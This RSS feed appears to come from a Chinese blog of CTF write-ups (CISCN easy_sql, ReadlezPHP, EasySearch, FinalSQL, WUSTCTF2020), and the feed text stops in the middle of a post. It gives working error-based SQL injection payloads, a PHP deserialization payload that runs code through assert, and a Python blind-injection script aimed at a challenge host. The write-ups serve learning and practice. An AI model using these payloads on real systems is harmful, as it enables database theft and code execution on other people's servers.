<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>CTF on</title><link>/categories/ctf/</link><description>Recent content in CTF on</description><generator>Hugo</generator><language>en</language><lastBuildDate>Wed, 18 Aug 2021 17:21:24 +0000</lastBuildDate><atom:link href="/categories/ctf/index.xml" rel="self" type="application/rss+xml"/><item><title>CISCN线上赛库存</title><link>/posts/ctf/ciscn%E7%BA%BF%E4%B8%8A%E8%B5%9B%E5%BA%93%E5%AD%98/</link><pubDate>Wed, 18 Aug 2021 17:21:24 +0000</pubDate><guid>/posts/ctf/ciscn%E7%BA%BF%E4%B8%8A%E8%B5%9B%E5%BA%93%E5%AD%98/</guid><description>&lt;h1 id="easy_sql">easy_sql&lt;/h1>
&lt;p>在用户名处，尝试sql注入，加上单引号报错，测试闭合，随便添加几个符号在password的报错附近中注意到了是&lt;strong>括号单引号闭合&lt;/strong>&lt;/p>
&lt;blockquote>
&lt;p>You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near &amp;lsquo;1&amp;rsquo;) LIMIT 0,1&amp;rsquo; at line 1&lt;/p>
&lt;/blockquote>
&lt;p>过滤的字符有union，所以尝试报错注入，查询版本号。&lt;/p>
&lt;pre tabindex="0">&lt;code>admin&amp;#39;) and (extractvalue(1,concat(0x7e,(select version()),0x7e)))#
&lt;/code>&lt;/pre>&lt;p>接下来想要通过&lt;strong>information_schema&lt;/strong>库查字段，但是发现被过滤了，所以猜表名和字段名，尝试出了flag表和表中的一个字段id，但是在id字段中只查询出了一个值：1，使用sqlmap跑也没跑出来。&lt;/p>
&lt;p>最后参考了网上的一篇文章：&lt;a href="https://blog.csdn.net/weixin_35867608/article/details/113937118">mysql 注入 information_schema_绕过IDS过滤information_schema继续注入&lt;/a>，模仿文章构造payload&lt;/p>
&lt;pre tabindex="0">&lt;code>admin&amp;#39;) and (extractvalue(1,concat(0x7e,(select * from (select * from flag a join flag b USING (id))c),0x7e)))#
&lt;/code>&lt;/pre>&lt;p>回显为：Duplicate column name &amp;rsquo;no&amp;rsquo;，一开始以为是报了个错，但是根据文章使用using继续把查到的no字段加上去，发现还有其他字段&lt;/p>
&lt;pre tabindex="0">&lt;code>Duplicate column name &amp;#39;28d9f90a-4120-4ee8-9079-4e7613699510&amp;#39;
&lt;/code>&lt;/pre>&lt;p>直接得到一个假的flag，真的还在flag表中，查询flag表中的改字段，报错注入长度有限制，所以加个substr一段一段截就出来了&lt;/p>
&lt;pre tabindex="0">&lt;code>admin&amp;#39;) and (extractvalue(1,concat(0x7e,substr((select `28d9f90a-4120-4ee8-9079-4e7613699510` from `flag`),1,30),0x7e)))#
&lt;/code>&lt;/pre>&lt;p>flag：CISCN{SWAqt-siWro-Wi7jV-FTdRm-9iOkG-}&lt;/p>
&lt;h1 id="easy_source">easy_source&lt;/h1>
&lt;p>使用目录扫描，扫描到了&lt;code>.index.php.swo&lt;/code>&lt;/p></description></item><item><title>ReadlezPHP&amp;EasySearch</title><link>/posts/ctf/readlezphpeasysearch/</link><pubDate>Tue, 20 Apr 2021 17:12:43 +0000</pubDate><guid>/posts/ctf/readlezphpeasysearch/</guid><description>&lt;h1 id="readlezphp">ReadlezPHP&lt;/h1>
&lt;p>源码找到&lt;code>time.php?source&lt;/code>&lt;/p>
&lt;p>&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20210420175641.png" alt="">&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-php" data-lang="php">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#a6e22e">php&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#error_reporting(0);
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#66d9ef">class&lt;/span> &lt;span style="color:#a6e22e">HelloPhp&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">public&lt;/span> $a;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">public&lt;/span> $b;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">function&lt;/span> __construct(){
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $this&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#a6e22e">a&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#34;Y-m-d h:i:s&amp;#34;&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $this&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#a6e22e">b&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#34;date&amp;#34;&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">function&lt;/span> __destruct(){
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $a &lt;span style="color:#f92672">=&lt;/span> $this&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#a6e22e">a&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $b &lt;span style="color:#f92672">=&lt;/span> $this&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#a6e22e">b&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">echo&lt;/span> $b($a);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$c &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> &lt;span style="color:#a6e22e">HelloPhp&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">if&lt;/span>(&lt;span style="color:#a6e22e">isset&lt;/span>($_GET[&lt;span style="color:#e6db74">&amp;#39;source&amp;#39;&lt;/span>]))
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">highlight_file&lt;/span>(&lt;span style="color:#66d9ef">__FILE__&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">die&lt;/span>(&lt;span style="color:#ae81ff">0&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">@&lt;/span>$ppp &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">unserialize&lt;/span>($_GET[&lt;span style="color:#e6db74">&amp;#34;data&amp;#34;&lt;/span>]);
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>分析一波：最后一行一个反序列化，所以很明显是反序列化的题目，在&lt;code>HelloPhp&lt;/code>中有一个&lt;code>__destruct&lt;/code>方法，会在创建的对象销毁时执行，注意里面有一个echo输出，最重要的是后面的函数调用 ，好像是在PHP7某个版本之后只是使用形如&lt;code>$a($b)&lt;/code>格式进行函数调用，假如变量&lt;code>a&lt;/code>为字符串&lt;code>var_dump&lt;/code>，&lt;code>b&lt;/code>是任意字符串，就相当于调用var_dump函数且参数为b。&lt;/p>
&lt;p>所以构造反序列化，调用assert函数执行phpinfo。如果向&lt;strong>assert()&lt;/strong> 函数传递字符串，它将会被 &lt;strong>assert()&lt;/strong> 当做 PHP 代码来执行)：&lt;/p>
&lt;pre tabindex="0">&lt;code>&amp;lt;?php
class HelloPhp
{
 public $a=&amp;#39;phpinfo()&amp;#39;;
 public $b=&amp;#39;assert&amp;#39;;
}

$s=new HelloPhp();
echo serialize($s);
&lt;/code>&lt;/pre>&lt;p>POST请求&lt;/p>
&lt;pre tabindex="0">&lt;code>time.php?data=O:8:&amp;#34;HelloPhp&amp;#34;:2:{s:1:&amp;#34;a&amp;#34;;s:9:&amp;#34;phpinfo()&amp;#34;;s:1:&amp;#34;b&amp;#34;;s:6:&amp;#34;assert&amp;#34;;}
&lt;/code>&lt;/pre>&lt;p>页面查找flag，在environment中找到flag&lt;/p>
&lt;p>&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20210420175822.png" alt="">&lt;/p>
&lt;h1 id="easysearch">EasySearch&lt;/h1>
&lt;p>&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20210420171541.png" alt="">&lt;/p>
&lt;p>进入页面以后试了试sql注入发现没用。第一步是看了wp找到的：使用扫描器扫描到&lt;code>index.php.swp&lt;/code>文件：&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-php" data-lang="php">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#a6e22e">php&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#a6e22e">ob_start&lt;/span>();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">function&lt;/span> &lt;span style="color:#a6e22e">get_hash&lt;/span>(){
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		$chars &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#39;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&amp;amp;*()+-&amp;#39;&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		$random &lt;span style="color:#f92672">=&lt;/span> $chars[&lt;span style="color:#a6e22e">mt_rand&lt;/span>(&lt;span style="color:#ae81ff">0&lt;/span>,&lt;span style="color:#ae81ff">73&lt;/span>)]&lt;span style="color:#f92672">.&lt;/span>$chars[&lt;span style="color:#a6e22e">mt_rand&lt;/span>(&lt;span style="color:#ae81ff">0&lt;/span>,&lt;span style="color:#ae81ff">73&lt;/span>)]&lt;span style="color:#f92672">.&lt;/span>$chars[&lt;span style="color:#a6e22e">mt_rand&lt;/span>(&lt;span style="color:#ae81ff">0&lt;/span>,&lt;span style="color:#ae81ff">73&lt;/span>)]&lt;span style="color:#f92672">.&lt;/span>$chars[&lt;span style="color:#a6e22e">mt_rand&lt;/span>(&lt;span style="color:#ae81ff">0&lt;/span>,&lt;span style="color:#ae81ff">73&lt;/span>)]&lt;span style="color:#f92672">.&lt;/span>$chars[&lt;span style="color:#a6e22e">mt_rand&lt;/span>(&lt;span style="color:#ae81ff">0&lt;/span>,&lt;span style="color:#ae81ff">73&lt;/span>)];&lt;span style="color:#75715e">//Random 5 times
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>		$content &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">uniqid&lt;/span>()&lt;span style="color:#f92672">.&lt;/span>$random;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		&lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#a6e22e">sha1&lt;/span>($content); 
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">header&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;Content-Type: text/html;charset=utf-8&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#f92672">***&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span>(&lt;span style="color:#a6e22e">isset&lt;/span>($_POST[&lt;span style="color:#e6db74">&amp;#39;username&amp;#39;&lt;/span>]) &lt;span style="color:#66d9ef">and&lt;/span> $_POST[&lt;span style="color:#e6db74">&amp;#39;username&amp;#39;&lt;/span>] &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#e6db74">&amp;#39;&amp;#39;&lt;/span> )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $admin &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#39;6d0bc1&amp;#39;&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> ( $admin &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#a6e22e">substr&lt;/span>(&lt;span style="color:#a6e22e">md5&lt;/span>($_POST[&lt;span style="color:#e6db74">&amp;#39;password&amp;#39;&lt;/span>]),&lt;span style="color:#ae81ff">0&lt;/span>,&lt;span style="color:#ae81ff">6&lt;/span>)) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">echo&lt;/span> &lt;span style="color:#e6db74">&amp;#34;&amp;lt;script&amp;gt;alert(&amp;#39;[+] Welcome to manage system&amp;#39;)&amp;lt;/script&amp;gt;&amp;#34;&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $file_shtml &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#34;public/&amp;#34;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">get_hash&lt;/span>()&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#e6db74">&amp;#34;.shtml&amp;#34;&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $shtml &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">fopen&lt;/span>($file_shtml, &lt;span style="color:#e6db74">&amp;#34;w&amp;#34;&lt;/span>) &lt;span style="color:#66d9ef">or&lt;/span> &lt;span style="color:#66d9ef">die&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;Unable to open file!&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $text &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#39;
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74"> ***
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74"> ***
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74"> &amp;lt;h1&amp;gt;Hello,&amp;#39;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>$_POST[&lt;span style="color:#e6db74">&amp;#39;username&amp;#39;&lt;/span>]&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&amp;lt;/h1&amp;gt;
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74"> ***
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74">			***&amp;#39;&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">fwrite&lt;/span>($shtml,$text);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">fclose&lt;/span>($shtml);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">***&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>			&lt;span style="color:#66d9ef">echo&lt;/span> &lt;span style="color:#e6db74">&amp;#34;[!] Header error ...&amp;#34;&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> } &lt;span style="color:#66d9ef">else&lt;/span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">echo&lt;/span> &lt;span style="color:#e6db74">&amp;#34;&amp;lt;script&amp;gt;alert(&amp;#39;[!] Failed&amp;#39;)&amp;lt;/script&amp;gt;&amp;#34;&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> 
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }&lt;span style="color:#66d9ef">else&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#f92672">***&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#f92672">***&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">?&amp;gt;&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>登陆功能又一个验证，需要传入的&lt;code>passwd&lt;/code>参数使用&lt;strong>md5&lt;/strong>加密以后是以&lt;strong>6d0bc1&lt;/strong>开头的。简单写个脚本跑一下就有了：&lt;/p></description></item><item><title>极客大挑战 2019 FinalSQL</title><link>/posts/ctf/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019finalsql/</link><pubDate>Sun, 18 Apr 2021 19:11:51 +0000</pubDate><guid>/posts/ctf/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019finalsql/</guid><description>&lt;p>还是同一场比赛的界面&lt;/p>
&lt;p>&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20210416224503.png" alt="">&lt;/p>
&lt;p>这次测试了下面的登陆框已经不能用了，无论怎么输入都是同一个回显：&lt;strong>你可别被我逮住了，臭弟弟&lt;/strong>，测试上面的序号，注意此时的url中有&lt;code>?id=&lt;/code>猜测是一个注入点，输入单引号一直报错，但是输入2-1时成功回显，判断是一个&lt;strong>数字型&lt;/strong>注入，数字型注入最多遇到的就是结合盲注，接下来是测试盲注的过滤。&lt;/p>
&lt;p>发现if、union、and等被过滤，在整个字符串中如果出现空格会被拦下，ord、ascii等转换字符没有被过滤，if被过滤可以使用strcmp函数等代替，空格可以使用括号绕过。&lt;/p>
&lt;p>贴出来自己的脚本：&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># codeing=utf-8&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> requests
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> time
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>url&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#39;http://1e069783-5d06-4d70-af82-c457e0d11a52.node3.buuoj.cn/search.php?id=&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>result&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">for&lt;/span> x &lt;span style="color:#f92672">in&lt;/span> range(&lt;span style="color:#ae81ff">1&lt;/span>, &lt;span style="color:#ae81ff">100&lt;/span>):
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	high &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">127&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	low &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">32&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	mid &lt;span style="color:#f92672">=&lt;/span> (low &lt;span style="color:#f92672">+&lt;/span> high) &lt;span style="color:#f92672">//&lt;/span> &lt;span style="color:#ae81ff">2&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">while&lt;/span> high&lt;span style="color:#f92672">&amp;gt;&lt;/span>low:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		&lt;span style="color:#75715e"># sql=&amp;#34;(ORD(SUBSTR((select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())),%d,1))=%d)&amp;#34;%(i,c)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		&lt;span style="color:#75715e"># sql = &amp;#34;(ORD(SUBSTR((select(group_concat(column_name))from(information_schema.columns)where(table_name=&amp;#39;F1naI1y&amp;#39;)),%d,1))&amp;gt;%d)&amp;#34; % (x, mid)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		sql &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#34;(ORD(SUBSTR((select(group_concat(password))from(F1naI1y)where(id=9)),&lt;/span>&lt;span style="color:#e6db74">%d&lt;/span>&lt;span style="color:#e6db74">,1))&amp;gt;&lt;/span>&lt;span style="color:#e6db74">%d&lt;/span>&lt;span style="color:#e6db74">)&amp;#34;&lt;/span> &lt;span style="color:#f92672">%&lt;/span> (x, mid)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		time&lt;span style="color:#f92672">.&lt;/span>sleep(&lt;span style="color:#ae81ff">0.1&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		reponse&lt;span style="color:#f92672">=&lt;/span>requests&lt;span style="color:#f92672">.&lt;/span>get(url&lt;span style="color:#f92672">+&lt;/span>sql)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		&lt;span style="color:#66d9ef">if&lt;/span> &lt;span style="color:#e6db74">&amp;#34;Click&amp;#34;&lt;/span> &lt;span style="color:#f92672">in&lt;/span> reponse&lt;span style="color:#f92672">.&lt;/span>text:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>			low&lt;span style="color:#f92672">=&lt;/span>mid&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		&lt;span style="color:#66d9ef">else&lt;/span>:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>			high &lt;span style="color:#f92672">=&lt;/span> mid
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		mid &lt;span style="color:#f92672">=&lt;/span> (low&lt;span style="color:#f92672">+&lt;/span>high)&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	result &lt;span style="color:#f92672">+=&lt;/span> chr(int(mid))
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	print(result)
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>我是直接使用了判断字符的返回值1或0作为id的参数，因为使用&lt;strong>group_concat&lt;/strong>拼接时字符串有逗号&lt;code>,&lt;/code>所以字符ascii需要至少从44开始。&lt;/p>
&lt;p>下面是查询到的两个表F1naI1y 、Flaaaaag及结构&lt;/p>
&lt;blockquote>
&lt;p>F1naI1y ====&amp;gt; id,username,password&lt;/p>
&lt;p>Flaaaaag ====&amp;gt; id,fl4gawsl&lt;/p></description></item><item><title>WUSTCTF2020 朴实无华</title><link>/posts/ctf/wustctf2020%E6%9C%B4%E5%AE%9E%E6%97%A0%E5%8D%8E/</link><pubDate>Fri, 16 Apr 2021 15:33:32 +0000</pubDate><guid>/posts/ctf/wustctf2020%E6%9C%B4%E5%AE%9E%E6%97%A0%E5%8D%8E/</guid><description>&lt;p>进入页面直接报错&lt;/p>
&lt;p>&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20210416103737.png" alt="">&lt;/p>
&lt;p>试试其他的地方，我的习惯是git泄露、请求头、robots.txt、hint.txt都看看。果然在robots下有内容&lt;/p>
&lt;blockquote>
&lt;p>User-agent: *
Disallow: /fAke_f1agggg.php&lt;/p>
&lt;/blockquote>
&lt;p>访问&lt;code>fAke_f1agggg.php&lt;/code>并且抓包，在响应头里有提示。&lt;/p>
&lt;p>&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20210416105630.png" alt="">&lt;/p>
&lt;p>访问&lt;code>fl4g.php&lt;/code>才正式开始，源码如下：&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-php" data-lang="php">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">&amp;lt;&lt;/span>&lt;span style="color:#a6e22e">img&lt;/span> &lt;span style="color:#a6e22e">src&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#34;/img.jpg&amp;#34;&lt;/span>&lt;span style="color:#f92672">&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#a6e22e">php&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">header&lt;/span>(&lt;span style="color:#e6db74">&amp;#39;Content-type:text/html;charset=utf-8&amp;#39;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">error_reporting&lt;/span>(&lt;span style="color:#ae81ff">0&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">highlight_file&lt;/span>(&lt;span style="color:#66d9ef">__file__&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">//level 1
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#66d9ef">if&lt;/span> (&lt;span style="color:#a6e22e">isset&lt;/span>($_GET[&lt;span style="color:#e6db74">&amp;#39;num&amp;#39;&lt;/span>])){
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $num &lt;span style="color:#f92672">=&lt;/span> $_GET[&lt;span style="color:#e6db74">&amp;#39;num&amp;#39;&lt;/span>];
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span>(&lt;span style="color:#a6e22e">intval&lt;/span>($num) &lt;span style="color:#f92672">&amp;lt;&lt;/span> &lt;span style="color:#ae81ff">2020&lt;/span> &lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span> &lt;span style="color:#a6e22e">intval&lt;/span>($num &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>) &lt;span style="color:#f92672">&amp;gt;&lt;/span> &lt;span style="color:#ae81ff">2021&lt;/span>){
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">echo&lt;/span> &lt;span style="color:#e6db74">&amp;#34;我不经意间看了看我的劳力士, 不是想看时间, 只是想不经意间, 让你知道我过得比你好.&amp;lt;/br&amp;gt;&amp;#34;&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }&lt;span style="color:#66d9ef">else&lt;/span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">die&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;金钱解决不了穷人的本质问题&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}&lt;span style="color:#66d9ef">else&lt;/span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">die&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;去非洲吧&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">//level 2
